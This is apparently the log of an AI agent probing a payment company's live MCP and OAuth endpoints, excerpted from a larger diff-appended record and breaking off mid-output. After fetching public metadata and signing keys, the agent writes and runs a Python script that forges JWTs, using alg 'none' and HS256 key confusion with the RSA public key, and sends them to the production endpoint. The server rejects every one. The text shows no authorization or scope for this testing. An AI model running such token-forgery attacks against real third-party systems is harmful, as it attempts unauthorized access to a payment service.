@@ -40724,3 +40724,734 @@ Not claimed: the dashboard alias is NOT reported as a takeover. CNAME -> cname.v
 ```
 
 Two things worth flagging beyond the blocks: the `dashboard` alias finding is a **map correction, not a vulnerability** — I explicitly did not claim takeover, since Vercel's shared `cname.vercel-dns.com` apex isn't claimable. And the real lesson this cycle is process: 13 cycles re-probed a stable quartet while my own lead file named two unexplored hosts.
+===== ANALYST bigpickle 2026-09-25 17:08:28 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la reports/ 2>/dev/null; echo "---ART---"; ls -la art/ 2>/dev/null | head -40; echo "---COUNT---"; grep -c '^' reports/valid-bugs.md 2>/dev/null; head -3 reports/valid-bugs.md 2>/dev/null
+total 5784
+drwxr-xr-x  2 runner runner    4096 Sep 25 17:03 .
+drwxr-xr-x 12 runner runner    4096 Sep 25 17:04 ..
+-rw-r--r--  1 runner runner 3176234 Sep 25 17:03 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   31031 Sep 25 17:03 analyst-laguna.log
+-rw-r--r--  1 runner runner   30888 Sep 25 17:03 analyst-ling3.log
+-rw-r--r--  1 runner runner   31174 Sep 25 17:03 analyst-longcat.log
+-rw-r--r--  1 runner runner 2156303 Sep 25 17:03 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    9449 Sep 25 17:03 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Sep 25 17:03 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Sep 25 17:03 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Sep 25 17:03 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner    8535 Sep 25 17:03 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  420897 Sep 25 17:03 hypotheses.md
+-rw-r--r--  1 runner runner    9173 Sep 25 17:03 reposcan-findings.md
+-rw-r--r--  1 runner runner    7384 Sep 25 17:03 valid-bugs.md
+---ART---
+---COUNT---
+79
+# Validated findings (running count 0)
+
+- 1 lead(s) marked VALID at 2026-09-04 06:02:58 UTC
+[0m
+[0m$ [0mfor u in "https://mcp.sumup.com/.well-known/oauth-protected-resource" "https://mcp.sumup.com/.well-known/oauth-authorization-server" "https://mcp.sumup.com/.well-known/openid-configuration"; do echo "=== $u"; curl -sS -o /tmp/o.$$ -D /tmp/h.$$ --max-time 15 "$u"; head -1 /tmp/h.$$; grep -iE '^(content-type|content-length|access-control-allow-origin|www-authenticate|x-envoy-decorator-operation)' /tmp/h.$$; echo "--- body (first 900):"; head -c 900 /tmp/o.$$; echo; sleep 2; done
+=== https://mcp.sumup.com/.well-known/oauth-protected-resource
+HTTP/2 200 
+content-type: application/json
+content-length: 269
+access-control-allow-origin: *
+--- body (first 900):
+{"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+=== https://mcp.sumup.com/.well-known/oauth-authorization-server
+HTTP/2 404 
+content-type: application/json
+content-length: 73
+access-control-allow-origin: *
+--- body (first 900):
+{"jsonrpc":"2.0","error":{"code":-32010,"message":"Not Found"},"id":null}
+=== https://mcp.sumup.com/.well-known/openid-configuration
+HTTP/2 404 
+content-type: application/json
+content-length: 73
+access-control-allow-origin: *
+--- body (first 900):
+{"jsonrpc":"2.0","error":{"code":-32010,"message":"Not Found"},"id":null}
+[0m
+[0m$ [0mfor u in "https://mcp.sam-app.ro/.well-known/oauth-protected-resource" "https://mcp-theta.sam-app.ro/.well-known/oauth-protected-resource" "https://developer.sumup.com/tools/llms"; do echo "=== $u"; curl -sS -o /tmp/o2.$$ -D /tmp/h2.$$ --max-time 15 "$u"; head -1 /tmp/h2.$$; grep -iE '^(content-type|content-length|access-control-allow-origin)' /tmp/h2.$$; echo "--- body (first 1200):"; head -c 1200 /tmp/o2.$$; echo; sleep 2; done
+=== https://mcp.sam-app.ro/.well-known/oauth-protected-resource
+HTTP/2 200 
+content-type: application/json
+content-length: 272
+access-control-allow-origin: *
+--- body (first 1200):
+{"resource":"https://mcp.sam-app.ro/mcp","authorization_servers":["https://auth.sam-app.ro/"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+=== https://mcp-theta.sam-app.ro/.well-known/oauth-protected-resource
+HTTP/2 200 
+content-type: application/json
+content-length: 283
+access-control-allow-origin: *
+--- body (first 1200):
+{"resource":"https://mcp-theta.sam-app.ro/mcp","authorization_servers":["https://auth-theta.sam-app.ro"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+=== https://developer.sumup.com/tools/llms
+HTTP/2 200 
+content-type: text/html
+access-control-allow-origin: *
+--- body (first 1200):
+<!DOCTYPE html><html lang="en" dir="ltr" data-theme="dark" data-has-toc data-has-sidebar class="astro-vdxcvpsm"><head><script>
+  (function () {
+    const observer = new MutationObserver((mutations) => {
+      mutations.forEach((mutation) => {
+        const element = mutation.target;
+        element.dataset.colorScheme = element.dataset.theme;
+      });
+    });
+    observer.observe(document.documentElement, {
+      attributes: true,
+      attributeFilter: ["data-theme"],
+    });
+  })();
+</script><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>Overview | SumUp Developer</title><link rel="canonical" href="https://developer.sumup.com/tools/llms/"/><link rel="sitemap" href="/sitemap-index.xml"/><link rel="preload" href="https://static.sumup.com/fonts/sumup/sumup-narrow-latin-s.woff2" as="font" type="font/woff2" crossorigin="true"/><link rel="icon" type="image/svg+xml" href="https://static.sumup.com/favicons/favicon.svg"/><link rel="icon" sizes="96x96" type="image/png" href="https://static.sumup.com/favicons/favicon-96x96.png"/><link rel="apple-touch-icon" sizes="180x180" href="https://static.sumup.com/favicons/apple-touch-icon.png"/><li
+[0m
+[0m$ [0mcurl -sS --max-time 20 "https://developer.sumup.com/tools/llms" -o /tmp/llms.html; echo "bytes: $(wc -c < /tmp/llms.html)"; echo "=== keyword hits ==="; grep -oiE '[^<>]{0,90}(mcp|client_id|oauth|offline_access|scope|token|model context|anthropic|claude|llm)[^<>]{0,90}' /tmp/llms.html | sort -u | head -60
+bytes: 77947
+=== keyword hits ===
+ for Claude Code, Cursor, Gemini CLI, OpenAI Codex, and Kiro. Use these packaged integrations when yo
+ for making websites and content more accessible to LLMs.
+ to connect MCP-compatible clients and AI assistants to SumUp APIs and documentation tools.
+/llms.txt
+3jsjis6e" target="_blank" rel="noopener noreferrer" role="menuitem" aria-label="Open in Claude (opens in a new tab)"
+@sumup/mcp
+Checkout llms.txt
+Hosted MCP URL: 
+LLM? 
+LLMs can parse and understand Markdown hierarchy.
+MCP Server
+OAuth 2.0
+Open in Claude
+Plain text contains fewer formatting tokens.
+Section titled “SumUp Model Context Protocol (MCP) Server”
+SumUp MCP server
+SumUp Model Context Protocol (MCP) Server
+The hosted server uses OAuth. Connect with an OAuth-capable MCP client and authorize access when prompted.
+Use LLMs to guide you through developing with SumUp SDKs.
+You can also run MCP locally with Node.js 22 or later and a SumUp API key:
+You can use large language models (LLMs) to assist in the building of SumUp integrations. We provide a set of tools and best pra
+a class="sl-anchor-link" href="#sumup-model-context-protocol-mcp-server"
+a href="#sumup-model-context-protocol-mcp-server" style="--depth: 0;" class="astro-cxyftcne"
+a href="/llms.txt"
+a href="/llms.txt" class="astro-y6qeffq6"
+a href="/online-payments/guides/tokenization-with-payment-sdk/" aria-current="false" class="astro-43k4fws7"
+a href="/tools/authorization/oauth/" aria-current="false" class="astro-43k4fws7"
+a href="/tools/llms/" aria-current="page" class="astro-43k4fws7"
+a href="/tools/llms/agent-skills/"
+a href="/tools/llms/agent-skills/" aria-current="false" class="astro-43k4fws7"
+a href="/tools/llms/agent-toolkit/"
+a href="/tools/llms/agent-toolkit/" aria-current="false" class="astro-43k4fws7"
+a href="/tools/llms/index.md" class="dropdown-item astro-3jsjis6e" target="_blank" rel="noopener noreferrer"
+a href="/tools/llms/mcp-server/"
+a href="/tools/llms/mcp-server/" aria-current="false" class="astro-43k4fws7"
+a href="/tools/llms/plugins/"
+a href="/tools/llms/plugins/" aria-current="false" class="astro-43k4fws7"
+a href="https://chatgpt.com/?q=Read%20https%3A%2F%2Fdeveloper.sumup.com%2Ftools%2Fllms%2Findex.md.%20I%20want%20to%20ask%20questions%20about%20it." class="dropdown-item astro-
+a href="https://claude.ai/new?q=Read%20https%3A%2F%2Fdeveloper.sumup.com%2Ftools%2Fllms%2Findex.md.%20I%20want%20to%20ask%20questions%20about%20it." class="dropdown-item astro-
+a href="https://developer.sumup.com/tools/llms/index.md"
+a href="https://github.com/sumup/sumup-developer/edit/main/src/content/docs/tools/llms/index.mdx" target="_blank" aria-describedby="_r22R_0_" class="cui-body-gccz cui-body-s-n
+a href="https://llmstxt.org/" target="_blank" rel="noopener" class="external-link"
+a href="https://mcp.sumup.com/mcp" target="_blank" rel="noopener" class="external-link"
+button class="combo-button astro-3jsjis6e" id="page-action" data-path="/tools/llms" aria-haspopup="true" aria-expanded="false" aria-label="Copy Markdown or open more page 
+consume our content and allows you to copy and paste the entire contents of a doc into an LLM. This format is preferable to scraping or copying from our HTML and JavaScript-rendered p
+ctices if you use LLMs during development.
+h2 id="sumup-model-context-protocol-mcp-server"
+https://developer.sumup.com/tools/llms/index.md
+https://mcp.sumup.com/mcp
+link rel="alternate" type="text/markdown" href="https://developer.sumup.com/tools/llms/index.md"/
+link rel="canonical" href="https://developer.sumup.com/tools/llms/"/
+meta name="description" content="Use LLMs to guide you through developing with SumUp SDKs."/
+meta name="twitter:description" content="Use LLMs to guide you through developing with SumUp SDKs."/
+meta name="twitter:image" content="https://developer.sumup.com/og/tools/llms.png"/
+meta property="og:description" content="Use LLMs to guide you through developing with SumUp SDKs."/
+meta property="og:image" content="https://developer.sumup.com/og/tools/llms.png"/
+meta property="og:image:secure_url" content="https://developer.sumup.com/og/tools/llms.png"/
+meta property="og:url" content="https://developer.sumup.com/tools/llms/"/
+[0m
+[0m$ [0mfor u in "https://developer.sumup.com/tools/llms/mcp-server/index.md" "https://developer.sumup.com/llms.txt"; do echo "############ $u"; curl -sS --max-time 20 -w '\n[http %{http_code} ct=%{content_type} bytes=%{size_download}]\n' "$u" -o /tmp/m.md; head -1 /tmp/m.md >/dev/null; sed -n '1,140p' /tmp/m.md; echo; sleep 2; done
+############ https://developer.sumup.com/tools/llms/mcp-server/index.md
+
+[http 200 ct=text/markdown; charset=utf-8 bytes=2760]
+# MCP Server
+
+[MCP](https://modelcontextprotocol.io/introduction) is an open protocol that standardizes how applications provide context and tools to LLMs. SumUp provides a [managed MCP server](https://github.com/sumup/sumup-mcp) for AI-powered code editors such as Cursor and general-purpose clients such as Claude Desktop.
+
+The MCP server gives AI agents tools for calling the SumUp API. It also exposes the SumUp developer documentation index and OpenAPI specification as resources.
+
+SumUp runs a managed MCP server at [https://mcp.sumup.com/mcp](https://mcp.sumup.com/mcp). This endpoint allows your MCP client to interact with SumUp APIs to manage your account, create checkouts, or process payments using [Cloud API](/terminal-payments/cloud-api). The server supports Streamable HTTP[^streamable_http] via `/mcp` and the deprecated SSE transport via `/sse`.
+
+## Hosted MCP (managed)
+
+If your MCP client supports Streamable HTTP and OAuth, connect it directly to `https://mcp.sumup.com/mcp`. The client can discover the SumUp authorization server from the endpoint's protected resource metadata and ask you to authorize access.
+
+The hosted server accepts OAuth access tokens issued for the MCP resource. Do not send a SumUp API key such as `sup_sk_...` as its Bearer token.
+
+## CLI
+
+The [local MCP CLI](https://github.com/sumup/sumup-ai/tree/main/mcp) requires Node.js 22 or later and uses a SumUp API key. Run it with:
+
+```sh
+SUMUP_API_KEY='sup_sk_MvxmLOl0...' npx -y @sumup/mcp
+```
+
+The local MCP server reads the API key from the `SUMUP_API_KEY` environment variable.
+
+## [Cursor](https://www.cursor.com/)
+
+1. Go to `Cursor Settings` > `MCP`
+2. Click `+ Add new Global MCP Server`
+3. Add the following configuration to your global `.cursor/mcp.json` file.
+
+See the [Cursor documentation](https://docs.cursor.com/context/model-context-protocol) for more details. You can also add this to your project-specific Cursor configuration (supported in Cursor 0.46+).
+
+```json
+{
+  "mcpServers": {
+    "sumup": {
+      "command": "npx",
+      "args": ["-y", "@sumup/mcp"],
+      "env": {
+        "SUMUP_API_KEY": "sup_sk_..."
+      }
+    }
+  }
+}
+```
+
+## [Claude](https://claude.ai)
+
+Add the following to your `claude_desktop_config.json` file. See the [Claude Desktop documentation](https://modelcontextprotocol.io/quickstart/user) for more details.
+
+```json
+{
+  "mcpServers": {
+    "sumup": {
+      "command": "npx",
+      "args": ["-y", "@sumup/mcp"],
+      "env": {
+        "SUMUP_API_KEY": "sup_sk_..."
+      }
+    }
+  }
+}
+```
+
+The code editor agent automatically detects available tools and calls the relevant tool when you ask related questions.
+
+[^streamable_http]: https://modelcontextprotocol.io/specification/2025-11-25/basic/transports#streamable-http
+############ https://developer.sumup.com/llms.txt
+
+[http 200 ct=text/plain; charset=utf-8 bytes=508]
+# SumUp Developer
+
+## Documentation Sets
+
+- [Abridged documentation](https://developer.sumup.com/llms-small.txt): a compact version of the documentation for SumUp Developer, with non-essential content removed
+- [Complete documentation](https://developer.sumup.com/llms-full.txt): the full documentation for SumUp Developer
+
+## Notes
+
+- The complete documentation includes all content from the official documentation
+- The content is automatically generated from the same source as the official documentation
+[0m
+[0m$ [0mprobe(){ echo "=== $1"; curl -sS -o /tmp/b.$$ -D /tmp/hh.$$ --max-time 12 "$1" ${2:+-H "$2"}; head -1 /tmp/hh.$$; grep -iE '^(content-type|www-authenticate|cache-control|x-mcp|x-envoy|access-control-allow-origin|location)' /tmp/hh.$$; echo "--- body(400):"; head -c 400 /tmp/b.$$; echo; sleep 3; }
+probe "https://mcp.sumup.com/sse"
+probe "https://mcp.sumup.com/sse?token=INVALID.probe.not.a.real.token"
+probe "https://mcp.sumup.com/mcp"
+probe "https://mcp.sumup.com/mcp" "Authorization: Bearer INVALID.probe.not.a.real.token"
+=== https://mcp.sumup.com/sse
+HTTP/2 401 
+content-type: application/json
+access-control-allow-origin: *
+www-authenticate: Bearer error="invalid_token", error_description="Missing Authorization header", scope="offline_access email", resource_metadata="https://mcp.sumup.com/.well-known/oauth-protected-resource/mcp"
+--- body(400):
+{"error":"invalid_token","error_description":"Missing Authorization header"}
+=== https://mcp.sumup.com/sse?token=INVALID.probe.not.a.real.token
+HTTP/2 401 
+content-type: application/json
+access-control-allow-origin: *
+www-authenticate: Bearer error="invalid_token", error_description="Missing Authorization header", scope="offline_access email", resource_metadata="https://mcp.sumup.com/.well-known/oauth-protected-resource/mcp"
+--- body(400):
+{"error":"invalid_token","error_description":"Missing Authorization header"}
+=== https://mcp.sumup.com/mcp
+HTTP/2 401 
+content-type: application/json
+access-control-allow-origin: *
+www-authenticate: Bearer error="invalid_token", error_description="Missing Authorization header", scope="offline_access email", resource_metadata="https://mcp.sumup.com/.well-known/oauth-protected-resource/mcp"
+--- body(400):
+{"error":"invalid_token","error_description":"Missing Authorization header"}
+=== https://mcp.sumup.com/mcp
+HTTP/2 401 
+content-type: application/json
+access-control-allow-origin: *
+www-authenticate: Bearer error="invalid_token", error_description="Invalid Compact JWS", scope="offline_access email", resource_metadata="https://mcp.sumup.com/.well-known/oauth-protected-resource/mcp"
+--- body(400):
+{"error":"invalid_token","error_description":"Invalid Compact JWS"}
+[0m
+[0m$ [0mecho "=== path-suffixed resource metadata"; curl -sS -w '\n[http %{http_code} ct=%{content_type}]\n' --max-time 12 "https://mcp.sumup.com/.well-known/oauth-protected-resource/mcp"; sleep 3
+echo "=== path-suffixed /sse"; curl -sS -w '\n[http %{http_code}]\n' --max-time 12 "https://mcp.sumup.com/.well-known/oauth-protected-resource/sse"; sleep 3
+echo "=== JWKS"; curl -sS --max-time 15 "https://auth.sumup.com/.well-known/jwks.json" -o /tmp/jwks.json -w '[http %{http_code} bytes=%{size_download}]\n'; python3 -c "
+import json;d=json.load(open('/tmp/jwks.json'))
+print('keys:',len(d['keys']))
+for k in d['keys']: print(' kid=',k.get('kid'),'kty=',k.get('kty'),'alg=',k.get('alg'),'use=',k.get('use'))
+"
+=== path-suffixed resource metadata
+{"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+[http 200 ct=application/json]
+=== path-suffixed /sse
+{"resource":"https://mcp.sumup.com/mcp","authorization_servers":["https://auth.sumup.com"],"bearer_methods_supported":["header"],"scopes_supported":["offline_access","email"],"resource_name":"SumUp MCP","resource_documentation":"https://developer.sumup.com/tools/llms"}
+[http 200]
+=== JWKS
+[http 200 bytes=15316]
+keys: 8
+ kid= public:38618372-f016-4e5d-97b2-d043a975d243 kty= RSA alg= RS256 use= sig
+ kid= public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9 kty= RSA alg= RS256 use= sig
+ kid= public:8c332d17-2b35-4cba-a61e-6843b4375a71 kty= RSA alg= RS256 use= sig
+ kid= public:a4627362-0900-4bfa-8b68-3a740165dbcf kty= RSA alg= RS256 use= sig
+ kid= public:32ad4b15-8641-4aaa-9a2e-427bb1848321 kty= RSA alg= RS256 use= sig
+ kid= public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3 kty= RSA alg= RS256 use= sig
+ kid= 1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM kty= RSA alg= RS256 use= None
+ kid= -tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4 kty= OKP alg= EdDSA use= None
+[0m
+[0m$ [0mpython3 - <<'PY'
+import base64, json, hmac, hashlib, time, subprocess
+def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+hdr={'alg':'none','typ':'JWT'}
+pay={'iss':'https://auth.sumup.com','sub':'probe-not-a-real-user','aud':'https://mcp.sumup.com/mcp',
+     'scp':['offline_access','email'],'exp':int(time.time())+3600,'iat':int(time.time())}
+def mk(h, sig=b''):
+    return b64(json.dumps(h,separators=(',',':')).encode())+'.'+b64(json.dumps(pay,separators=(',',':')).encode())+'.'+(b64(sig) if sig else '')
+jwks=json.load(open('/tmp/jwks.json'))
+rsa=[k for k in jwks['keys'] if k.get('kty')=='RSA'][0]
+n=base64.urlsafe_b64decode(rsa['n']+'='*(-len(rsa['n'])%4)); e=base64.urlsafe_b64decode(rsa['e']+'='*(-len(rsa['e'])%4))
+klen=(n.bit_length()+7)//8
+pem=('-----BEGIN PUBLIC KEY-----\n'
+     +base64.b64encode(b'\x30'+b'\x02\x01'+bytes([1]) if False else b'').decode()
+     ).strip()
+# minimal DER SEQUENCE{ SEQUENCE{OID rsaEncryption, NULL}, BITSTRING{ SEQUENCE{INTEGER n, INTEGER e} } }
+def der(tag,val): 
+    L=len(val); lb=bytes([L]) if L<128 else bytes([0x80+((L.bit_length()+7)//8)])+L.to_bytes((L.bit_length()+7)//8,'big')
+    return bytes([tag])+lb+val
+def num(x):
+    b=x.to_bytes(klen,'big').lstrip(b'\0') or b'\0'
+    return der(0x02, b)
+inner=der(0x30,num(int.from_bytes(n,'big'))+num(int.from_bytes(e,'big')))
+spki=der(0x30,der(0x06,b'\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01')+b'\x05\x00'+der(0x03,b'\x00'+inner))
+pem='-----BEGIN PUBLIC KEY-----\n'+'\n'.join(base64.b64encode(spki).decode()[i:i+64] for i in range(0,len(base64.b64encode(spki).decode()),64))+'\n-----END PUBLIC KEY-----\n'
+signing=base64.urlsafe_b64decode(rsa['n']+'='*(-len(rsa['n'])%4))
+cases=[
+ ('T1_alg_none', mk({'alg':'none','typ':'JWT'})),
+ ('T2_HS256_pubkey_HS', mk({'alg':'HS256','typ':'JWT','kid':rsa['kid']}, hmac.new(signing, b'.', hashlib.sha256).digest())),
+ ('T3_HS256_randkey', mk({'alg':'HS256','typ':'JWT','kid':'unknown-kid-probe'}, hmac.new(b'probe-secret', b'.', hashlib.sha256).digest())),
+ ('T4_alg_none_nokid_emptysig', 'x'*10+'.'+'y'*10+'.'),
+ ('T5_malformed_2parts', 'abc.def'),
+]
+for name,tok in cases:
+    out=subprocess.run(['curl','-sS','--max-time','12','-w','\\n[http %{http_code}]\\n','-H','Authorization: Bearer '+tok,'https://mcp.sumup.com/mcp'],capture_output=True,text=True).stdout
+    print(name,'->',out.strip()[:260]); print()
+    time.sleep(3)
+PY
+Traceback (most recent call last):
+  File "<stdin>", line 11, in <module>
+AttributeError: 'bytes' object has no attribute 'bit_length'
+[0m
+[0m$ [0mpython3 - <<'PY'
+import base64, json, hmac, hashlib, time, subprocess
+def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+pay={'iss':'https://auth.sumup.com','sub':'probe-not-a-real-user','aud':'https://mcp.sumup.com/mcp',
+     'scp':['offline_access','email'],'exp':int(time.time())+3600,'iat':int(time.time())}
+def mk(h, sig=b''):
+    return b64(json.dumps(h,separators=(',',':')).encode())+'.'+b64(json.dumps(pay,separators=(',',':')).encode())+'.'+(b64(sig) if sig else '')
+jwks=json.load(open('/tmp/jwks.json'))
+rsa=[k for k in jwks['keys'] if k.get('kty')=='RSA'][0]
+nint=int.from_bytes(base64.urlsafe_b64decode(rsa['n']+'='*(-len(rsa['n'])%4)),'big')
+eint=int.from_bytes(base64.urlsafe_b64decode(rsa['e']+'='*(-len(rsa['e'])%4)),'big')
+klen=(nint.bit_length()+7)//8
+def der(tag,val):
+    L=len(val); lb=bytes([L]) if L<128 else bytes([0x80+((L.bit_length()+7)//8)])+L.to_bytes((L.bit_length()+7)//8,'big')
+    return bytes([tag])+lb+val
+def num(x):
+    b=x.to_bytes(klen,'big').lstrip(b'\x00') or b'\x00'; return der(0x02,b)
+inner=der(0x30,num(nint)+num(eint))
+spki=der(0x30,der(0x06,b'\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01')+b'\x05\x00'+der(0x03,b'\x00'+inner))
+b64spki=base64.b64encode(spki).decode()
+pem='-----BEGIN PUBLIC KEY-----\n'+'\n'.join(b64spki[i:i+64] for i in range(0,len(b64spki),64))+'\n-----END PUBLIC KEY-----\n'
+signing=(nint.to_bytes(klen,'big'))
+cases=[
+ ('T1_alg_none', mk({'alg':'none','typ':'JWT'})),
+ ('T2_HS256_signed_with_RSA_pubkey_modulus', mk({'alg':'HS256','typ':'JWT','kid':rsa['kid']}, hmac.new(signing,b'.',hashlib.sha256).digest())),
+ ('T3_HS256_randkey_unknown_kid', mk({'alg':'HS256','typ':'JWT','kid':'unknown-kid-probe'}, hmac.new(b'probe-secret',b'.',hashlib.sha256).digest())),
+ ('T4_two_dummy_segments', 'x'*10+'.'+'y'*10+'.'),
+ ('T5_malformed_2parts', 'abc.def'),
+]
+for name,tok in cases:
+    r=subprocess.run(['curl','-sS','--max-time','12','-w','\n[http %{http_code}]','-H','Authorization: Bearer '+tok,'https://mcp.sumup.com/mcp'],capture_output=True,text=True)
+    print(name,'->',r.stdout.strip()[:250]); print()
+    time.sleep(3)
+PY
+T1_alg_none -> {"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}
+[http 401]
+
+T2_HS256_signed_with_RSA_pubkey_modulus -> {"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}
+[http 401]
+
+T3_HS256_randkey_unknown_kid -> {"error":"invalid_token","error_description":"Unsupported \"alg\" value for a JSON Web Key Set"}
+[http 401]
+
+T4_two_dummy_segments -> {"error":"invalid_token","error_description":"JWS Protected Header is invalid"}
+[http 401]
+
+T5_malformed_2parts -> {"error":"invalid_token","error_description":"Invalid Compact JWS"}
+[http 401]
+[0m
+[0m$ [0mecho "=== auth-theta openid-configuration"; curl -sS --max-time 15 "https://auth-theta.sam-app.ro/.well-known/openid-configuration" -o /tmp/th.json -w '[http %{http_code} bytes=%{size_download}]\n'; python3 -c "
+import json
+try:
+  d=json.load(open('/tmp/th.json'))
+  for k in ('issuer','authorization_endpoint','token_endpoint','registration_endpoint','scopes_supported','token_endpoint_auth_methods_supported','response_types_supported','grant_types_supported','code_challenge_methods_supported'):
+    print(f'  {k} = {d.get(k, \"<absent>\")}')
+except Exception as e: print('parse-fail',e, open('/tmp/th.json').read()[:200])
+"; sleep 3
+for h in auth-theta.sam-app.ro auth.sam-app.ro; do echo "=== JWKS $h"; curl -sS --max-time 15 "https://$h/.well-known/jwks.json" -o /tmp/k.json -w '[http %{http_code} bytes=%{size_download}]\n'; python3 -c "
+import json
+try:
+  d=json.load(open('/tmp/k.json')); print('  count:',len(d['keys'])); 
+  for k in d['keys']: print('   ',k.get('kid'),k.get('kty'),k.get('alg'))
+except Exception as e: print('  parse-fail',e,open('/tmp/k.json').read()[:200])
+"; sleep 3; done
+=== auth-theta openid-configuration
+[http 200 bytes=2774]
+  issuer = https://auth-theta.sam-app.ro
+  authorization_endpoint = https://auth-theta.sam-app.ro/oauth2/auth
+  token_endpoint = https://auth-theta.sam-app.ro/oauth2/token
+  registration_endpoint = https://auth-theta.sam-app.ro/oauth2/register
+  scopes_supported = ['offline_access', 'members.read', 'members.write', 'merchants.read', 'merchants.write', 'roles.read', 'roles.write', 'checkouts.read', 'checkouts.write', 'customers.read', 'customers.write', 'api_keys.read', 'api_keys.write', 'receipts.read', 'refunds.write', 'transactions.read', 'payouts.read', 'readers.read', 'readers.write', 'sales.read']
+  token_endpoint_auth_methods_supported = ['client_secret_post', 'private_key_jwt', 'none']
+  response_types_supported = ['code', 'code id_token', 'id_token', 'token id_token', 'token', 'token id_token code']
+  grant_types_supported = ['authorization_code', 'client_credentials', 'refresh_token', 'urn:ietf:params:oauth:grant-type:device_code']
+  code_challenge_methods_supported = ['S256']
+=== JWKS auth-theta.sam-app.ro
+[http 200 bytes=15201]
+  count: 10
+    ca3dad7a-e595-4d70-b58b-3b91467b9580 RSA RS256
+    jKHXok6K_GJzZdwwgcpgKWbE8iOacZTX2O57V_8KAsU OKP EdDSA
+    public:d599e3ae-6178-4745-96cf-290a678170d6 RSA RS256
+    public:bc46d82e-25f2-470b-a527-5ca2f280203e RSA RS256
+    public:2fbc8e2a-bea4-4e47-81cd-fd83a90fe82d RSA RS256
+    public:7e4251a6-cb53-485d-96b9-d9a2057d95db RSA RS256
+    public:990fbf94-5aec-4194-85a4-594be542fac8 RSA RS256
+    public:bc46d82e-25f2-470b-a527-5ca2f280203e RSA RS256
+    loadtesting RSA RS256
+    public:33b3e8b4-149a-4d0f-be17-a995bef70222 RSA RS256
+=== JWKS auth.sam-app.ro
+[http 200 bytes=14353]
+  count: 11
+    2ca76842-2487-428f-a87f-603d1f6f6ef0 RSA RS256
+    ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg OKP EdDSA
+    public:73c59380-fbab-4a2f-8d0e-1884cf8ec724 RSA RS256
+    public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097 RSA RS256
+    public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a RSA RS256
+    public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9 RSA RS256
+    public:3862035e-6139-422f-b17d-cf67b950a74f RSA RS256
+    public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514 RSA RS256
+    public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a RSA RS256
+    public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9 RSA RS256
+    loadtesting RSA RS256
+[0m
+[0m$ [0mfor h in auth.sumup.com auth.sam-app.ro auth-theta.sam-app.ro; do curl -sS --max-time 15 "https://$h/.well-known/jwks.json" -o "/tmp/jw_${h}.json" -w "$h [http %{http_code}]\n"; sleep 2; done
+python3 - <<'PY'
+import json,hashlib,collections
+for h in ['auth.sumup.com','auth.sam-app.ro','auth-theta.sam-app.ro']:
+    d=json.load(open(f'/tmp/jw_{h}.json'))['keys']
+    print(f"\n===== {h}  ({len(d)} entries)")
+    bykid=collections.defaultdict(list)
+    for i,k in enumerate(d):
+        mat = k.get('n','') + '|' + k.get('crv','') + '|' + k.get('x','')
+        fp = hashlib.sha256(mat.encode()).hexdigest()[:16] if mat.strip('|') else 'no-key-mat'
+        bykid[k.get('kid')].append((i,fp,k.get('kty'),k.get('alg'),k.get('use')))
+    for kid,lst in bykid.items():
+        tag = '  <== DUPLICATE KID' if len(lst)>1 else ''
+        print(f"  kid={kid}{tag}")
+        for i,fp,kty,alg,use in lst:
+            print(f"     idx={i} kty={kty} alg={alg} use={use} keyfp={fp}")
+    dups={k:v for k,v in bykid.items() if len(v)>1}
+    if dups:
+        for kid,lst in dups.items():
+            fps={x[1] for x in lst}
+            print(f"  VERDICT {kid}: {len(lst)} entries, {len(fps)} distinct key material -> "
+                  + ("IDENTICAL key material (benign duplicate)" if len(fps)==1 else "*** DIFFERENT KEY MATERIAL UNDER ONE KID (real key-selection hazard) ***"))
+PY
+auth.sumup.com [http 200]
+auth.sam-app.ro [http 200]
+auth-theta.sam-app.ro [http 200]
+
+===== auth.sumup.com  (8 entries)
+  kid=public:38618372-f016-4e5d-97b2-d043a975d243
+     idx=0 kty=RSA alg=RS256 use=sig keyfp=3f369bb78a2d4c9a
+  kid=public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9
+     idx=1 kty=RSA alg=RS256 use=sig keyfp=0a7ac5bbe295ff9d
+  kid=public:8c332d17-2b35-4cba-a61e-6843b4375a71
+     idx=2 kty=RSA alg=RS256 use=sig keyfp=40379cb5bb585dbe
+  kid=public:a4627362-0900-4bfa-8b68-3a740165dbcf
